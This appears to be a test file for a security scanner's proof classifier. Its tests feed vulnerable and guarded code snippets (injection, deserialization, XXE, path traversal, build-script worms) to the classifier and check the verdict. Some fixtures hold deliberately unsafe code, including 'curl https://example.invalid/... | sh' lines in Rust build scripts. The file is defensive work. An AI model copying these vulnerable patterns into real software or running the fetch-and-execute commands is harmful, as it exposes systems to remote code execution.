    fn debug_endpoint_auth_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:unauthenticated_debug_endpoint".to_string(),
            file: Some("server/routes/debug.rs".to_string()),
            ..Default::default()
        };
        let source = "router.get('/internal/metrics', requiresAuth(middleware(handler)));";
        assert_eq!(
            super::classify_debug_endpoint_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn debug_endpoint_unguarded_internal_metrics_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:unauthenticated_debug_endpoint".to_string(),
            file: Some("server/routes/status.rs".to_string()),
            ..Default::default()
        };
        let source = "router.get('/internal/metrics', metrics_handler);";
        assert_eq!(
            super::classify_debug_endpoint_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn xxe_saml_parser_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:xxe_saml_parser".to_string(),
            file: Some("internal/idp/providers/saml/saml_test.go".to_string()),
            ..Default::default()
        };
        let source = "func TestSAML(t *testing.T) { xml.NewDecoder(bytes.NewReader(assertion)) }";
        assert_eq!(
            super::classify_xxe_saml_parser_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn xxe_saml_parser_hardened_java_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:xxe_saml_parser".to_string(),
            file: Some("src/main/java/idp/SamlParser.java".to_string()),
            ..Default::default()
        };
        let source = "DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();\nf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nparseSamlAssertion(f);";
        assert_eq!(
            super::classify_xxe_saml_parser_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn xxe_saml_parser_unguarded_go_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:xxe_saml_parser".to_string(),
            file: Some("internal/idp/providers/saml/saml.go".to_string()),
            ..Default::default()
        };
        let source = "func ParseSAMLResponse(body io.Reader) { decoder := xml.NewDecoder(body); var assertion Assertion; decoder.Decode(&assertion) }";
        assert_eq!(
            super::classify_xxe_saml_parser_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn saml_xsw_test_fixture_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:saml_xsw_validation_order".to_string(),
            file: Some("src/test/java/idp/SamlXswFixture.java".to_string()),
            ..Default::default()
        };
        let source = "DocumentBuilderFactory.newInstance(); verifySignature(doc); String id = assertion.getAttribute(\"ID\");";
        assert_eq!(
            super::classify_saml_xsw_validation_order_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn saml_xsw_validated_assertion_helper_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:saml_xsw_validation_order".to_string(),
            file: Some("src/main/java/idp/SamlAcsController.java".to_string()),
            ..Default::default()
        };
        let source = "Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input);\nAssertion validatedAssertion = validateAssertion(doc);\nString nameId = validatedAssertion.getSubject().getNameID();";
        assert_eq!(
            super::classify_saml_xsw_validation_order_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn saml_xsw_signature_before_selected_assertion_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:saml_xsw_validation_order".to_string(),
            file: Some("src/main/java/idp/SamlAcsController.java".to_string()),
            ..Default::default()
        };
        let source = "Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input);\nverifySignature(doc);\nNode assertion = doc.getElementsByTagName(\"Assertion\").item(0);\nString nameId = assertion.getTextContent();";
        assert_eq!(
            super::classify_saml_xsw_validation_order_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn jndi_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:jndi_injection".to_string(),
            file: Some("src/test/java/app/JndiLookupTest.java".to_string()),
            ..Default::default()
        };
        let source = "InitialContext ctx = new InitialContext(); Object obj = ctx.lookup(request.getParameter(\"name\"));";
        assert_eq!(
            super::classify_jndi_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn jndi_constant_container_context_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:jndi_injection".to_string(),
            file: Some("src/main/java/app/DataSourceFactory.java".to_string()),
            ..Default::default()
        };
        let source = "InitialContext ctx = new InitialContext(); DataSource ds = (DataSource) ctx.lookup(\"java:comp/env/jdbc/app\");";
        assert_eq!(
            super::classify_jndi_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn jndi_http_parameter_lookup_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:jndi_injection".to_string(),
            file: Some("src/main/java/app/JndiController.java".to_string()),
            ..Default::default()
        };
        let source = "void doGet(HttpServletRequest request) { InitialContext ctx = new InitialContext(); Object obj = ctx.lookup(request.getParameter(\"name\")); }";
        assert_eq!(
            super::classify_jndi_injection_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn eval_injection_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:eval_injection".to_string(),
            file: Some("spec/lua/eval_spec.lua".to_string()),
            ..Default::default()
        };
        let source = "local f = loadstring(ngx.req.get_body_data())";
        assert_eq!(
            super::classify_eval_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn eval_injection_literal_eval_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:eval_injection".to_string(),
            file: Some("kong/runloop/balancer/targets.lua".to_string()),
            ..Default::default()
        };
        let source = "local f = loadstring(\"return 1 + 1\")";
        assert_eq!(
            super::classify_eval_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn eval_injection_request_body_loadstring_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:eval_injection".to_string(),
            file: Some("kong/runloop/balancer/targets.lua".to_string()),
            ..Default::default()
        };
        let source = "local code = ngx.req.get_body_data()\nlocal f = loadstring(code)\nreturn f()";
        assert_eq!(
            super::classify_eval_injection_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn process_builder_windows_service_install_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:process_builder_injection".to_string(),
            file: Some(
                "quarkus/runtime/src/main/java/org/keycloak/quarkus/runtime/cli/command/WindowsServiceInstall.java"
                    .to_string(),
            ),
            ..Default::default()
        };
        let source = "new ProcessBuilder(command).start();";
        assert_eq!(
            super::classify_process_builder_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn process_builder_fixed_command_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:process_builder_injection".to_string(),
            file: Some("src/main/java/app/HealthCheck.java".to_string()),
            ..Default::default()
        };
        let source = "Process p = new ProcessBuilder(\"git\", \"status\").start();";
        assert_eq!(
            super::classify_process_builder_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn process_builder_request_parameter_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:process_builder_injection".to_string(),
            file: Some("src/main/java/app/RunController.java".to_string()),
            ..Default::default()
        };
        let source = "void run(HttpServletRequest request) throws Exception { String cmd = request.getParameter(\"cmd\"); new ProcessBuilder(cmd).start(); }";
        assert_eq!(
            super::classify_process_builder_injection_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn pqc_hybrid_keyutils_constant_utility_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:pqc_hybrid_downgrade".to_string(),
            file: Some("common/src/main/java/org/keycloak/common/util/KeyUtils.java".to_string()),
            ..Default::default()
        };
        let source = "KeyPairGenerator.getInstance(\"RSA\").generateKeyPair();";
        assert_eq!(
            super::classify_pqc_hybrid_downgrade_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn pqc_hybrid_policy_pin_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:pqc_hybrid_downgrade".to_string(),
            file: Some("src/main/java/auth/SignatureVerifier.java".to_string()),
            ..Default::default()
        };
        let source =
            "requireHybrid(policy); allowedAlgorithms = List.of(\"ML-DSA\", \"ML-KEM\"); verify(signature);";
        assert_eq!(
            super::classify_pqc_hybrid_downgrade_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn pqc_hybrid_legacy_algorithm_negotiation_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:pqc_hybrid_downgrade".to_string(),
            file: Some("src/main/java/auth/SignatureVerifier.java".to_string()),
            ..Default::default()
        };
        let source =
            "boolean hybrid = tenant.requiresPqc(); String algorithm = header.alg(); if (algorithm.equals(\"RS256\")) verify(signature);";
        assert_eq!(
            super::classify_pqc_hybrid_downgrade_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn oauth_excessive_scope_local_operator_config_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:oauth_excessive_scope".to_string(),
            file: Some("config/local/operator-oauth.yaml".to_string()),
            ..Default::default()
        };
        let source = "scope: repo admin:org";
        assert_eq!(
            super::classify_oauth_excessive_scope_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn oauth_excessive_scope_resource_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:oauth_excessive_scope".to_string(),
            file: Some("src/oauth/github_token.go".to_string()),
            ..Default::default()
        };
        let source = "scope=repo&resource=repo:owner/name&validate_scope(scope)";
        assert_eq!(
            super::classify_oauth_excessive_scope_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn oauth_excessive_scope_request_token_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:oauth_excessive_scope".to_string(),
            file: Some("src/oauth/github_token.go".to_string()),
            ..Default::default()
        };
        let source =
            "func mint(req Request) { scope := req.Query(\"scope\") + \" repo admin:org\"; request_token(scope); }";
        assert_eq!(
            super::classify_oauth_excessive_scope_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn unverified_provenance_docs_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "supply_chain:unverified_provenance".to_string(),
            file: Some("docs/examples/Cargo.toml".to_string()),
            ..Default::default()
        };
        let source = "[dependencies]\nplugin = { git = \"https://github.com/acme/plugin\" }";
        assert_eq!(
            super::classify_unverified_provenance_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn unverified_provenance_checksum_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "supply_chain:unverified_provenance".to_string(),
            file: Some("build/deps.yml".to_string()),
            ..Default::default()
        };
        let source =
            "download: https://github.com/acme/tool/releases/download/v1/tool.tgz\nsha256: deadbeef";
        assert_eq!(
            super::classify_unverified_provenance_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn unverified_provenance_raw_git_dependency_yields_reachability() {
        let finding = StructuredFinding {
            id: "supply_chain:unverified_provenance".to_string(),
            file: Some("Cargo.toml".to_string()),
            ..Default::default()
        };
        let source = "[dependencies]\nplugin = { git = \"https://github.com/acme/plugin\" }";
        assert_eq!(
            super::classify_unverified_provenance_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn cargo_build_worm_example_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:cargo_build_worm".to_string(),
            file: Some("examples/native/build.rs".to_string()),
            ..Default::default()
        };
        let source = r#"fn main() { std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid/x | sh").status().unwrap(); }"#;
        assert_eq!(
            super::classify_cargo_build_worm_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn cargo_build_worm_out_dir_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:cargo_build_worm".to_string(),
            file: Some("crates/native/build.rs".to_string()),
            ..Default::default()
        };
        let source = r#"fn main() { let out = std::env::var("OUT_DIR").unwrap(); std::fs::write(format!("{out}/bindings.rs"), "ok").unwrap(); }"#;
        assert_eq!(
            super::classify_cargo_build_worm_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn cargo_build_worm_remote_shell_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:cargo_build_worm".to_string(),
            file: Some("crates/native/build.rs".to_string()),
            ..Default::default()
        };
        let source = r#"fn main() { std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid/install.sh | sh").status().unwrap(); }"#;
        assert_eq!(
            super::classify_cargo_build_worm_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn ci_persistence_docs_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:ci_persistence_vector".to_string(),
            file: Some("docs/examples/postinst".to_string()),
            ..Default::default()
        };
        let source = "systemctl enable janitor-agent.service";
        assert_eq!(
            super::classify_ci_persistence_vector_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn ci_persistence_attestation_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:ci_persistence_vector".to_string(),
            file: Some("packaging/deb/control/postinst".to_string()),
            ..Default::default()
        };
        let source = "sha256sum -c agent.sha256 && systemctl enable janitor-agent.service";
        assert_eq!(
            super::classify_ci_persistence_vector_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn ci_persistence_postinst_systemd_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:ci_persistence_vector".to_string(),
            file: Some("packaging/deb/control/postinst".to_string()),
            ..Default::default()
        };
        let source =
            "cp agent.service /etc/systemd/system/agent.service\nsystemctl enable agent.service";
        assert_eq!(
            super::classify_ci_persistence_vector_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn java_deser_generated_fixture_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:java_deser_allowlist_bypass".to_string(),
            file: Some("src/generated/java/app/DeserFixture.java".to_string()),
            ..Default::default()
        };
        let source = "ObjectInputStream ois = new ObjectInputStream(inputStream); Object obj = ois.readObject();";
        assert_eq!(
            super::classify_java_deser_allowlist_bypass_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn java_deser_object_input_filter_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:java_deser_allowlist_bypass".to_string(),
            file: Some("src/main/java/app/SessionDecoder.java".to_string()),
            ..Default::default()
        };
        let source = "ObjectInputStream ois = new ObjectInputStream(request.getInputStream()); ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(\"com.acme.*;!*\")); Object obj = ois.readObject();";
        assert_eq!(
            super::classify_java_deser_allowlist_bypass_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn java_deser_request_stream_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:java_deser_allowlist_bypass".to_string(),
            file: Some("src/main/java/app/SessionDecoder.java".to_string()),
            ..Default::default()
        };
        let source = "void read(HttpServletRequest request) throws Exception { ObjectInputStream ois = new ObjectInputStream(request.getInputStream()); Object obj = ois.readObject(); }";
        assert_eq!(
            super::classify_java_deser_allowlist_bypass_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn unsafe_deserialization_benchmark_cache_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:unsafe_deserialization".to_string(),
            file: Some("script/benchmarks/cache/bench.rb".to_string()),
            ..Default::default()
        };
        let source = "obj = Marshal.load(cache_blob)";
        assert_eq!(
            super::classify_unsafe_deserialization_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn unsafe_deserialization_safe_loader_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:unsafe_deserialization".to_string(),
            file: Some("src/api/config_loader.py".to_string()),
            ..Default::default()
        };
        let source = "payload = request.body\nobj = yaml.load(payload, Loader=yaml.SafeLoader)";
        assert_eq!(
            super::classify_unsafe_deserialization_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn unsafe_deserialization_request_pickle_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:unsafe_deserialization".to_string(),
            file: Some("src/api/session_loader.py".to_string()),
            ..Default::default()
        };
        let source = "def load_session(request):\n    payload = request.body\n    return pickle.loads(payload)";
        assert_eq!(
            super::classify_unsafe_deserialization_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn mcp_confused_deputy_test_fixture_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:mcp_confused_deputy_dispatch".to_string(),
            file: Some("tests/mcp_dispatch_fixture.rs".to_string()),
            ..Default::default()
        };
        let source =
            "let session = sessions.get(req.id).unwrap(); session.invoke(req.tool, req.args).await";
        assert_eq!(
            super::classify_mcp_confused_deputy_dispatch_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn mcp_confused_deputy_capability_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:mcp_confused_deputy_dispatch".to_string(),
            file: Some("src/mcp/server.rs".to_string()),
            ..Default::default()
        };
        let source = "let session = sessions.get(req.id).filter(|s| verify_session(s.secret, &req.presented_secret)).unwrap(); session.invoke(req.tool, req.args).await";
        assert_eq!(
            super::classify_mcp_confused_deputy_dispatch_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn mcp_confused_deputy_unguarded_dispatch_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:mcp_confused_deputy_dispatch".to_string(),
            file: Some("src/mcp/server.rs".to_string()),
            ..Default::default()
        };
        let source =
            "let session = sessions.get(req.id).unwrap(); session.invoke(req.tool, req.args).await";
        assert_eq!(
            super::classify_mcp_confused_deputy_dispatch_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn ffi_memory_corruption_generated_binding_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:ffi_memory_corruption".to_string(),
            file: Some("src/generated/bindings.rs".to_string()),
            ..Default::default()
        };
        let source = "pub unsafe extern \"C\" fn read(ptr: *mut u8, len: usize) { let s = std::slice::from_raw_parts(ptr, len); }";
        assert_eq!(
            super::classify_ffi_memory_corruption_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn ffi_memory_corruption_null_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:ffi_memory_corruption".to_string(),
            file: Some("src/ffi/export.rs".to_string()),
            ..Default::default()
        };
        let source = "pub extern \"C\" fn read(ptr: *mut u8, len: usize) { if ptr.is_null() || len == 0 { return; } let s = unsafe { std::slice::from_raw_parts(ptr, len) }; }";
        assert_eq!(
            super::classify_ffi_memory_corruption_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn ffi_memory_corruption_unguarded_export_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:ffi_memory_corruption".to_string(),
            file: Some("src/ffi/export.rs".to_string()),
            ..Default::default()
        };
        let source = "pub extern \"C\" fn read(ptr: *mut u8, len: usize) { let s = unsafe { std::slice::from_raw_parts(ptr, len) }; process(s); }";
        assert_eq!(
            super::classify_ffi_memory_corruption_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn go_bytes_equal_without_subtle_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some("server/channels/app/user.go".to_string()),
            line: Some(1669),
            ..Default::default()
        };
        let source =
            "func (a *App) CheckPasswordAndAllCriteria(user *model.User, password string) *model.AppError {\n    if !bytes.Equal([]byte(user.Password), []byte(password)) {\n        return model.NewAppError()\n    }\n}";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn go_bytes_equal_with_subtle_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some("server/channels/app/user.go".to_string()),
            line: Some(1669),
            ..Default::default()
        };
        let source =
            "func (a *App) CheckPasswordAndAllCriteria(user *model.User, password string) *model.AppError {\n    if subtle.ConstantTimeCompare([]byte(user.Password), []byte(password)) != 1 {\n        return model.NewAppError()\n    }\n}";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn financial_pii_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            file: Some("services/gateway/test/ws_test.go".to_string()),
            ..Default::default()
        };
        let source = "ssn := req.SSN\nws.WriteMessage(ssn)";
        assert_eq!(
            super::classify_financial_pii_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn financial_pii_masked_yields_invariant_violation() {
        let finding = StructuredFinding {
            file: Some("services/gateway/network/wsconnection.go".to_string()),
            ..Default::default()
        };
        let source = "sanitized := redact(user.ssn)\nclient.chat(sanitized)";
        assert_eq!(
            super::classify_financial_pii_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn financial_pii_unmasked_llm_sink_yields_reachability() {
        let finding = StructuredFinding {
            file: Some("services/gateway/network/wsconnection.go".to_string()),
            ..Default::default()
        };
        let source = "payload := req.credit_card\nws.WriteMessage(websocket.TextMessage, payload)";
        assert_eq!(
            super::classify_financial_pii_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // ── embedding_trust_transposition proof tests ──────────────────────────

    #[test]
    fn embedding_trust_test_fixture_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:embedding_trust_transposition".to_string(),
            file: Some("tests/rag_test.py".to_string()),
            ..Default::default()
        };
        let source = "results = vector_store.similarity_search(query)";
        assert_eq!(
            super::classify_embedding_trust_transposition_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn embedding_trust_source_allowlist_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:embedding_trust_transposition".to_string(),
            file: Some("app/rag/retriever.py".to_string()),
            ..Default::default()
        };
        let source = "results = vector_store.similarity_search(query)\nresults = [r for r in results if r.metadata['source'] in trusted_sources]";
        assert_eq!(
            super::classify_embedding_trust_transposition_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn embedding_trust_unguarded_production_retrieval_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:embedding_trust_transposition".to_string(),
            file: Some("app/rag/retriever.py".to_string()),
            ..Default::default()
        };
        let source = "user_input = request.json['query']\nresults = vector_store.similarity_search(user_input)\ncontext = '\\n'.join([r.page_content for r in results])\nresponse = llm.invoke(context)";
        assert_eq!(
            super::classify_embedding_trust_transposition_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn embedding_trust_go_utility_no_llm_sink_yields_lattice_gap() {
        // Regression: teleport lib/srv/db/common/auth.go and lib/utils/aws/signing.go
        // have no LLM API call — must NOT yield ReachabilityProof.
        let finding = StructuredFinding {
            id: "security:embedding_trust_transposition".to_string(),
            file: Some("lib/srv/db/common/auth.go".to_string()),
            ..Default::default()
        };
        let source = "results := db.similarity_search(query)\nreq.Header.Set(\"Authorization\", token)\nuser_input := r.URL.Query().Get(\"q\")";
        assert_eq!(
            super::classify_embedding_trust_transposition_proof(source, &finding),
            ProofClass::LatticeGapProposal
        );
    }

    // ── rag_context_poisoning proof tests ──────────────────────────────────

    #[test]
    fn rag_context_poisoning_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:rag_context_poisoning".to_string(),
            file: Some("tests/test_rag.py".to_string()),
            ..Default::default()
        };
        let source = "doc = fetch(url).text()\nopenai.chat.completions.create(messages=[{'role':'user','content':doc}])";
        assert_eq!(
            super::classify_rag_context_poisoning_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn rag_context_poisoning_isolation_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:rag_context_poisoning".to_string(),
            file: Some("app/rag/chain.py".to_string()),
            ..Default::default()
        };
        let source = "doc = fetch(request.args['url']).text()\nclean = context_filter(doc)\nllm.invoke(clean)";
        assert_eq!(
            super::classify_rag_context_poisoning_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn rag_context_poisoning_unguarded_production_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:rag_context_poisoning".to_string(),
            file: Some("app/rag/chain.py".to_string()),
            ..Default::default()
        };
        let source = "user_input = request.args['q']\ndoc = fetch(user_input).text()\nllm.invoke(doc)\nsystem_prompt += doc";
        assert_eq!(
            super::classify_rag_context_poisoning_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // ── path_traversal_concatenation proof tests ───────────────────────────

    #[test]
    fn path_traversal_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:path_traversal_concatenation".to_string(),
            file: Some("tests/test_files.py".to_string()),
            line: Some(5),
            ..Default::default()
        };
        let source = "import os\nfilename = user_input\npath = os.path.join(base, filename)\nwith open(path) as f:\n    data = f.read()";
        assert_eq!(
            super::classify_path_traversal_concat_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn path_traversal_realpath_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:path_traversal_concatenation".to_string(),
            file: Some("app/files/serve.py".to_string()),
            line: Some(3),
            ..Default::default()
        };
        let source = "filename = request.args['file']\npath = os.path.join(base_dir, filename)\npath = os.path.realpath(path)\nwith open(path) as f:\n    return f.read()";
        assert_eq!(
            super::classify_path_traversal_concat_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn path_traversal_unguarded_user_input_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:path_traversal_concatenation".to_string(),
            file: Some("app/files/serve.py".to_string()),
            line: Some(2),
            ..Default::default()
        };
        let source = "filename = request.args['file']\npath = os.path.join(base_dir, filename)\nwith open(path) as f:\n    return f.read()";
        assert_eq!(
            super::classify_path_traversal_concat_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // ── dynamic_import proof tests ─────────────────────────────────────────

    #[test]
    fn dynamic_import_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:dynamic_import".to_string(),
            file: Some("tests/test_plugins.py".to_string()),
            ..Default::default()
        };
        let source = "module = request.args['module']\nplugin = importlib.import_module(module)";
        assert_eq!(
            super::classify_dynamic_import_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn dynamic_import_allowlist_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:dynamic_import".to_string(),
            file: Some("app/plugins/loader.py".to_string()),
            ..Default::default()
        };
        let source = "module_name = request.args['plugin']\nif module_name not in ALLOWED_MODULES:\n    raise ValueError\nplugin = importlib.import_module(module_name)";
        assert_eq!(
            super::classify_dynamic_import_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn dynamic_import_unguarded_user_input_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:dynamic_import".to_string(),
            file: Some("app/plugins/loader.py".to_string()),
            ..Default::default()
        };
        let source = "module_name = request.args['plugin']\nplugin = importlib.import_module(module_name)\nresult = plugin.run()";
        assert_eq!(
            super::classify_dynamic_import_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // ── dangerous_execution proof tests ────────────────────────────────────

    #[test]
    fn dangerous_execution_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:dangerous_execution".to_string(),
            file: Some("tests/test_shell.py".to_string()),
            ..Default::default()
        };
        let source = "cmd = request.args['command']\nos.system(cmd)";
        assert_eq!(
            super::classify_dangerous_execution_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn dangerous_execution_shlex_quote_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:dangerous_execution".to_string(),
            file: Some("app/utils/runner.py".to_string()),
            ..Default::default()
        };
        let source = "cmd_arg = request.args['input']\nsafe_arg = shlex.quote(cmd_arg)\nsubprocess.run(['ls', safe_arg], shell=True)";
        assert_eq!(
            super::classify_dangerous_execution_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn dangerous_execution_unguarded_user_input_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:dangerous_execution".to_string(),
            file: Some("app/api/execute.py".to_string()),
            ..Default::default()
        };
        let source = "command = request.args['cmd']\nresult = subprocess.run(command, shell=True, capture_output=True)";
        assert_eq!(
            super::classify_dangerous_execution_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // --- bounded_overflow_witness classifier tests ---

    #[test]
    fn bounded_overflow_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:bounded_overflow_witness".to_string(),
            file: Some("src/bench_ecmult.c".to_string()),
            ..Default::default()
        };
        let source = "void *buf = malloc(n * sizeof(item));\n";
        assert_eq!(
            super::classify_bounded_overflow_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn bounded_overflow_check_visible_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:bounded_overflow_witness".to_string(),
            file: Some("src/EOS/Asset.cpp".to_string()),
            ..Default::default()
        };
        let source = "if (__builtin_add_overflow(a, b, &result)) return ERR;\nvoid *buf = malloc(result * sizeof(int));";
        assert_eq!(
            super::classify_bounded_overflow_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn bounded_overflow_user_controlled_bound_yields_reachability() {
        // User-controlled bound (argv) reaches malloc without check → ReachabilityProof.
        let finding = StructuredFinding {
            id: "security:bounded_overflow_witness".to_string(),
